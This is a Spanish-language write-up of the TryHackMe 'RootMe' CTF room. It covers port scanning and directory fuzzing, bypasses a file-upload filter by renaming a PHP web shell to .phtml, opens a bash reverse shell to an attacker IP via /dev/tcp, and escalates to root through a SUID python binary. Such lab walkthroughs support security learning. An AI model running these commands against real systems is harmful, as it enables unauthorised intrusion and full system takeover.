---
title: RootMe - TryHackMe
date: 2023-04-14
categories: [Writeup, THM]
tags: [Linux, THM, CTF, Easy, Unrestricted File Upload, SUID]
img_path: /assets/img/commons/rootme/
image: rootme.png
---

¡Hola!

En este writeup vamos a explorar la sala [**RootMe**](https://tryhackme.com/room/rrootme) de TryHackMe, una de las salas más fáciles en la plataforma. En esta sala, aprenderemos a realizar el fuzzing de directorios para encontrar un panel que nos permitirá subir archivos y un directorio de listado donde se almacenan los archivos subidos. También descubriremos cómo eludir un filtro simple para subir archivos PHP y obtener acceso a la máquina. Finalmente, abusaremos del binario Python con permisos SUID para escalar a privilegios root.

¡Empecemos!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.163.218
PING 10.10.163.218 (10.10.163.218) 56(84) bytes of data.
64 bytes from 10.10.163.218: icmp_seq=1 ttl=61 time=289 ms

--- 10.10.163.218 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 288.719/288.719/288.719/0.000 ms
```

Dado que el `TTL` es cercano a 64, podemos inferir que la máquina objetivo probablemente sea Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.163.218 -oG allPorts.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-14 22:34 -05
Nmap scan report for 10.10.163.218
Host is up (0.29s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.86 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 22,80 -sV -sC --min-rate 5000 10.10.163.218 -oN services.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-14 22:36 -05
Nmap scan report for 10.10.163.218
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)
|   256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)
|_  256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.09 seconds
```

Observamos que solamente hay dos puertos abiertos: `SSH (22)` y `HTTP (80)`.

### HTTP - 80

Al acceder al servicio web, nos encontramos con la siguiente página web.

![web](web.png)

Al examinar su código fuente, no encontramos nada relevante. Por lo tanto, procedemos a realizar fuzzing de directorios para identificar alguna información útil.

```bash
❯ wfuzz -c -L -t 64 --hc=404,403 --hh=616 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.163.218/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.163.218/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                              
=====================================================================

000000164:   200        15 L     49 W       744 Ch      "uploads"                                                                                                            
000000550:   200        17 L     67 W       1126 Ch     "css"                                                                                                                
000000953:   200        16 L     60 W       959 Ch      "js"                                                                                                                 
000005520:   200        22 L     47 W       732 Ch      "panel"                                                                                                              

Total time: 0
Processed Requests: 220560
Filtered Requests: 220556
Requests/sec.: 0
```

Uno de los directorios que más llama la atención es `uploads`. Al acceder, nos encontramos con lo que parece ser un **directory listing** de archivos y directorios subidos en el servidor Web.

![uploads](uploads.png)

Otro directorio sospechoso es `panel`. Al acceder a él, nos encontramos con el siguiente panel que nos permite subir archivos al servidor web.

![panel](panel.png)

Utilizamos la extensión `Wappalyzer` para identificar las tecnologías que utiliza el servidor y encontramos la siguiente información:

![wappalyzer](wappalyzer.png)

Dado que el servidor utiliza el lenguaje de programación PHP, intentamos subir un archivo con dicha extensión. Sin embargo, no tuvimos éxito y se nos presentó el siguiente error:

![error](error.png)

En ese caso, lo que podemos hacer es capturar la petición con `Burp Suite` y realizar fuzzing sobre la extensión del archivo para identificar una extensión permitida. 

![payload_positions](payload_positions.png)

Para ello, utilizaremos el módulo **Sniper** de Burp Suite para realizar dicha tarea. Configuramos nuestro payload como una simple lista con las extensiones más comunes de PHP.

![payload](payload.png)

Desactivamos la codificación de caracteres para evitar posibles errores.

![payload_encoding](payload_encoding.png)

Opcionalmente, también podemos establecer un patrón para identificar de manera más fácil cuando una extensión es permitida.

![grep](grep.png)

Lanzamos el ataque y podemos ver que prácticamente todas las extensiones están permitidas, excepto la extensión `.php`.

![results](results.png)

## Explotación

---

### Carga de archivos sin restricciones (Unrestricted File Upload)

Entonces, podemos aprovecharnos de esto para cargar una web shell al servidor con cualquiera de las extensiones permitidas, excepto la extensión `.php`. En este caso, haremos uso de la web shell [easy-simple-php-webshell.php](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985) y le cambiaremos la extensión por `.phtml`.

![success](success.png)

Una vez subida la web shell, accedemos al directorio `uploads` para confirmar que está en el servidor.

![uploads2](uploads2.png)

Accedemos a la web shell y ejecutamos el comando `id` para ver si el servidor interpreta correctamente el comando.

![id](id.png)

Una vez confirmada la ejecución de código, podemos establecer una reverse shell hacia nuestro equipo atacante con el siguiente comando:

```bash
bash -c "bash -i >& /dev/tcp/192.168.221.140/443 0>&1"
```

Para recibir la conexión, primero debemos establecer nuestro listener en el puerto especificado en el comando anterior.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.2.11.100] from (UNKNOWN) [10.10.163.218] 50014
bash: cannot set terminal process group (892): Inappropriate ioctl for device
bash: no job control in this shell
www-data@rootme:/var/www/html/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Una vez ganado acceso al sistema, debemos buscar la primera flag del usuario. Para facilitar este proceso, ejecutamos el siguiente comando:

```bash
www-data@rootme:/home/rootme$ find / -name user.txt -type f 2>/dev/null
/var/www/user.txt
```

Identificada la ruta, procedemos a leer la flag.

```bash
www-data@rootme:/home/rootme$ cat /var/www/user.txt
THM{***************}
```

## Escalación de privilegios

---

### Abuso del binario python con SUID

Ahora, nuestro objetivo es intentar escalar privilegios como usuario root. Si enumeramos los binarios con permisos `SUID`, obtenemos la siguiente lista.

```bash
www-data@rootme:/home/rootme$ find / -perm -4000 -uid 0 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
```

De todos ellos, el que más nos llama la atención es `/usr/bin/python`, ya que fácilmente podemos generar una shell con privilegios del propietario, tal y como nos muestra [GTFOBins](https://gtfobins.github.io/).

![suid](suid.png)

Así que procedemos a ejecutar el comando y obtenemos un shell como `root`.

```bash
www-data@rootme:/home/rootme$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
```

Finalmente, accedemos al directorio principal del usuario `root` y leemos la última flag de esta máquina.

```bash
# cat root.txt
THM{********************}
```

¡Happy Hacking!
